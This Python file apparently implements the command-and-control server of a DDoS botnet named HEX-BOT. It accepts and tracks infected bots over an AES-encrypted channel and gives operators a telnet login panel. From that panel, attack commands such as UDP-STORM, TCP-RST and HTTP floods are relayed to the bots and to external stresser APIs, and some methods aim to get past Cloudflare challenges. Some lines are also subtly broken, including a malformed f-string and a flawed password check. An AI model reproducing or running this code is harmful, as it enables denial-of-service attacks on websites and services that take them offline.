import socket,random,string,base64,threading,time,os,requests
from Encryptor import AES_Encryption
from clients.banner import create_banner,create_HELP,banner_meth,same
from bs4 import BeautifulSoup
from urllib.parse import urlparse

login = [['ROOT','ROOT'],['ADMIN','ADMIN'],['HEX','HEX']]

def random_unique(length):
 return ''.join([random.choice(string.ascii_letters+string.digits+'_.-+=,:;|!@$%^&*()<>?/]}{[') for _ in range(length)])

offline = 0
online = 0

def get_api():
    with open(f"{os.getcwd()}\\server\\API.txt",'r') as f:
        return f.read()

def fast_check(a,mode=1,opt={"User-Agent":"Hex-Bots/API 2024.05.101 TEST"},junk=''):
  if mode == 1:global offline,online
  try:
    r = requests.get(a,headers=opt,timeout=2)
    soup = BeautifulSoup(r.content, 'html.parser')
    title = soup.title.string
    if mode == 1:
      if r.status_code == 404 and title != 'Run this Repl to see the results here.':online += 1; print(a)
      else:offline += 1
    else:
      l = a.replace("https://","").replace("http://","")
      if r.status_code == 404 and title != 'Run this Repl to see the results here.':
        junk.send(f'\x1b[38;5;76mSENDING ATTACK DONE \x1b[38;5;255m--> \x1b[38;5;81mapi://{random_unique(len(l))\x1b[0m\r\n'.encode())
      else:
        junk.send(f'\x1b[38;5;196mSENDING ATTACK FAILED \x1b[38;5;255m--> \x1b[38;5;197mapi://{random_unique(len(l))\x1b[0m\r\n'.encode())
  except:
    if mode == 1:offline += 1
    else:
      junk.send(f'\x1b[38;5;196mSENDING ATTACK FAILED \x1b[38;5;255m--> \x1b[38;5;197mapi://{random_unique(len(l))\x1b[0m\r\n'.encode())

def check_api():
   global offline,online
   while True:
    api = get_api().split('\n')
    offline = 0; online = 0
    time.sleep(0.1)
    for a in api:
      threading.Thread(target=fast_check,args=(a,1)).start()
    time.sleep(5)

bots = []

def bots_test():
  global bots
  while True:
      time.sleep(5)
      for a in bots:
        try:
          code = 0
          a[0].sendall(base64.b64encode(AES_Encryption(key=a[1][0], iv=a[1][1], mode=2).encrypt(f'PING')))
          try_e = 0
          while True:
              d = a[0].recv(65536)
              if not d:
                  try_e += 1
                  if try_e > 10:code=1;break
                  else:continue
              break
          d_e = AES_Encryption(key=a[1][0], iv=a[1][1], mode=2).decrypt(base64.b64decode(d))
          if d_e == 'PONG' and code == 0:pass
          else:bots.remove(a)
        except Exception as e:print(e); bots.remove(a)

def handshake_botnet(s, ip):
    global bots
    encode = 0
    aes_list = []
    try:
        while True:
            data = s.recv(65536).decode().split(" ")
            print(data)
            if data[0] == 'AES256':
                if data[1] == 'CREATE':  # AES256 CREATE
                    s.sendall(f'{random_unique(32)}#{random_unique(16)}'.encode())
                elif data[1] == 'AUTH': # AES256 AUTH KEY IV
                    KEY = data[2]
                    IV = data[3]
                    aes_list.append(KEY)
                    aes_list.append(IV)
                    aes_encryptor = AES_Encryption(key=KEY, iv=IV, mode=2)
                    str_t = random_unique(25)
                    encrypted_str = aes_encryptor.encrypt(str_t)
                    s.sendall(base64.b64encode(encrypted_str))
                    encode = 1
                elif data[1] == 'TEST':  # AES256 TEST DATA
                    if encode == 1:
                        decoded_data = base64.b64decode(data[2].encode())
                        if decoded_data == str_t.encode():
                            s.sendall(b"PASSED")
                            encode = 2
                        else:
                            s.sendall(f"FAILED".encode())
            elif data[0] == 'ECHO': # ECHO DATA
                s.sendall(f'{data[1]}'.encode())
            elif data[0] == 'LOGIN': # LOGIN
                encode=3;break
            if encode == 2 or encode == 3:
                break
        if encode == 3:
           threading.Thread(target=handshake_client,args=(s, ip)).start()
        else:
         c = 0
         if len(bots) > 0:
          print('yes')
          print(bots)
          for a in bots:
           if ip[0] != a[2]:c = 1; break
           else:c = 0
         else:
           c = 1
         if c == 1:
           bots.append([s,aes_list,ip[0]])
         else:s.close()
    except Exception as e:print(e); pass

def handle_title(s,ip):
  global bots
  try:
    while True:
      for a in ['\\','|','/','-']:
       s.sendall(f'\33]0;[{a}] <{time.ctime()}> .:|:. BOTS={len(bots)} API={online}/{offline} LOGIN={ip[0]} .:|:. WELCOME TO HEX-BOT\a'.encode())
       time.sleep(0.1)
  except:pass

def bot_sent(com):
  global bots
  message = []
  if len(bots) != 0:
    for a in bots:
      try:
       a[0].sendall(base64.b64encode(AES_Encryption(key=a[1][0], iv=a[1][1], mode=2).encrypt(com)))
       while True:
        d = a[0].recv(65536)
        if not d:
          continue
        break
       d_e = AES_Encryption(key=a[1][0], iv=a[1][1], mode=2).decrypt(base64.b64decode(d))
       message.append(d_e)
      except:pass
  return message

def command(com,mode=1):
  length = []
  total = mode
  while True:
    try:
      length.append(com[total])
      total += 1
    except:break
  return length

def sent_packet(length,s):
  for a in bot_sent(' '.join(length)):
    s.sendall(a.encode())
    if len(bots) != 1:s.send(b'\r\n\r\n')
    else:s.send(b'\r\n')

def input_socket(s,value):
  try:
    test = value.decode()
  except:
    value = value.encode()
  s.send(value)
  while True:
    data = s.recv(65536).decode().strip()
    if not data:
      continue
    break
  return data

def sender_api(s,list_meth,now):
 headers = {}
 methods = now
 hostname = input_socket(s,"Target ?")
 scheme = ''
 ports = 80
 proxy = ''
 links = ''
 if methods.upper() in list_meth:
   parsed_url = urlparse(hostname)
   hostname = parsed_url.hostname
   scheme = parsed_url.scheme
   links = parsed_url.path or '/'
 if methods.upper() == 'BROWSER':
   proxy = input_socket(s,"\x1b[38;5;196mType \x1b[38;5;76mNone \x1b[38;5;77mSOCKS5 \x1b[38;5;78mSOCKS4 \x1b[38;5;79mHTTP \x1b[38;5;80mHTTPS \x1b[38;5;255m?\x1b[0m")
 elif methods.upper() in ['COOKIE', 'COOKIE2']:
   s.send('URL CF __cf_chl_tk,__cf_chl_rt_tk,__cf_chl_f_tk,__cf_chl_captcha_tk__,__cf_chl_managed_tk__,__cf_chl_jschl_tk__'.encode())
   proxy = input_socket(s,"Type OPT 0-6 ?")
 if methods.upper() == 'HTTP-19':
   ports = int(input_socket(s,"Ports ?"))
 meth_http = input_socket(s,"HTTP-METHODS GET, POST and etc ?")
 times = int(input_socket(s,"TIMES ?"))
 th = int(input_socket(s,"THREAD ?"))
 a = f'target={hostname}&time={times}&threads={th}&methods={methods}'
 opt = {'X-Port':str(ports),'X-Methods':meth_http,'X-Protocols':scheme,'X-Links':links,'X-Browser':proxy}
 for a2 in get_api().split('\n'):
   threading.Thread(target=fast_check,args=(a2+a,2,opt,s)).start()

def client_command(s,u):
  try:
    list_meth = ['BROWSER','HANDSHAKE','AMP','MURD-OPT','RAPID-FAST','MURD','COOKIE2','COOKIE']
    time.sleep(1)
    s.send(b'\033[2J\033[H')
    for a in create_banner("main",[time.ctime(),str(len(bots)),u]):
      s.send((a+'\r\n').encode()); time.sleep(0.1)
    prompt = f'\x1b[0m\r\n\x1b[38;5;196m{u}\x1b[38;5;255m@\x1b[38;5;76mH\x1b[38;5;77mE\x1b[38;5;78mX\x1b[38;5;79m-\x1b[38;5;80mB\x1b[38;5;81mO\x1b[38;5;80mT\x1b[38;5;79mS \x1b[38;5;86m\x1b[1;3m'.encode()
    s.send(prompt)
    while 1:
      data = s.recv(65536).decode().strip()
      com = data.upper().split(' ')
      if not data:continue
      if com[0] in ['CLS','CLEAR']:s.send(b'\033[2J\033[H')
      elif com[0] in list_meth:
        sender_api(s,list_meth,com[0])
      elif com[0] in ['TCP-RST','TCP_RESET','TCP_RST','TCP-RESET','UDP-STORM','UDPSTORM','UDP_STORM','HTTP-19','HTTP','H19','HTTP_19','STOP','END-ATTACK','END_ATTACK','END-ATK','CLOSE-ATK','CLOSE-ATTACK']:
       if len(com) != 1:
         all_com = command(com,mode=0)
         sent_packet(all_com,s)
       else:
         sent_packet(com,s)
      elif com[0] == 'BOTS':
        if len(com) != 1:
         all_com = command(com)
         sent_packet(all_com,s)
        else:
          s.send(f'\x1b[38;5;196mBOTS \x1b[38;5;76m<\x1b[38;5;77mCOMMAND\x1b[38;5;76m>'.encode())
      elif com[0] == 'MENU':
        s.send(b'\033[2J\033[H')
        for a in create_banner("main",[time.ctime(),str(len(bots)),u]):s.send((a+'\r\n').encode()); time.sleep(0.1)
      elif com[0] in ['METH','METHODS','HUB','LIST']:
        for a in banner_meth:
         s.send((a+'\r\n').encode()); time.sleep(0.1)
      elif com[0] in ['TOTAL','COUNT','MUCH','ONLINE','OFFLINE','OFF','ON']:
        api = get_api().split('\n')
        list_all = []
        for a in api:
          list_all.append([a,'SERVER'])
        for a in bots:
          list_all.append([a,'BOTNET'])
        s.send(same(list_all).encode())
      elif com[0] == 'HELP':
        for a in create_HELP():
         s.send((a+'\r\n').encode()); time.sleep(0.1)
      else:s.send(f'\x1b[38;5;196m{data}\x1b[0m'.encode())
      s.send(prompt)
  except Exception as e:print(e)

def handshake_client(s, ip):
  global login
  try:
    s.send(b'\033[2J\033[H');s.sendall(b"WELCOME TO LOGIN PAGE!\r\n\x1b[38;5;196mU\x1b[38;5;197ms\x1b[38;5;198me\x1b[38;5;199mr\x1b[38;5;200mn\x1b[38;5;201ma\x1b[38;5;207mm\x1b[38;5;213me \x1b[38;5;255m$\x1b[0m")
    code = 0
    user = ''
    pwd = ''
    leaks_code = 0
    while True:
      data = s.recv(65536).decode().strip()
      if not data:
        continue
      if data.split(" ")[0] == 'ECHO':
        s.send(data.split(" ")[1].encode()); code = 1; break
      else:
        user = data; break
    if code != 1:
      pwd = input_socket(s,b"\x1b[38;5;76mP\x1b[38;5;77m\x1b[38;5;78ma\x1b[38;5;79ms\x1b[38;5;80ms\x1b[38;5;81mw\x1b[38;5;87mo\x1b[38;5;86mr\x1b[38;5;85md \x1b[38;5;255m$\x1b[0m")
      c = 0
      for a in login:
        if user.upper() == a[0] and pwd.upper() == a[0]:
          c = 1; break
      if c == 1:
        s.send(b"\x1b[38;5;76mPASSED!\x1b[0m"); threading.Thread(target=handle_title,args=(s,ip)).start(); threading.Thread(target=client_command,args=(s,user)).start()
      else:s.send(b"\x1b[38;5;196mFAILED TO LOGIN!\x1b[0m")
    else:
      while True:
       data = s.recv(65536).decode().strip()
       if data.split(" ")[0] == 'AES256':
        if data.split(" ")[1] == 'CREATE':
         s.send(f'{random_unique(32)}#{random_unique(16)}'.encode())
         threading.Thread(target=handshake_botnet,args=(s, ip)).start(); break
  except Exception as e:print(e)

def botnet_server():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  port = 1
  while True:
   try:
    s.bind(('0.0.0.0',port)); break
   except:port += 1
  print(f"[+] Listen bots at {port} . . .")
  s.listen()
  while True:
   socks, ip = s.accept()
   threading.Thread(target=handshake_botnet,args=(socks,ip)).start()

def client_server():
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 1
 while True:
   try:
    s.bind(('0.0.0.0',port)); break
   except:port += 1
 print(f"[+] Listen client at {port} . . .")
 s.listen()
 while True:
   socks, ip = s.accept()
   socks.sendall(b'\33]0;LOGIN PLS!\a')
   threading.Thread(target=handshake_client,args=(socks,ip)).start()

print(f"Connection with TELNET or RAW only ( PUTTY ) . . .")
threading.Thread(target=check_api).start()
threading.Thread(target=bots_test).start()
threading.Thread(target=client_server).start()
threading.Thread(target=botnet_server).start()
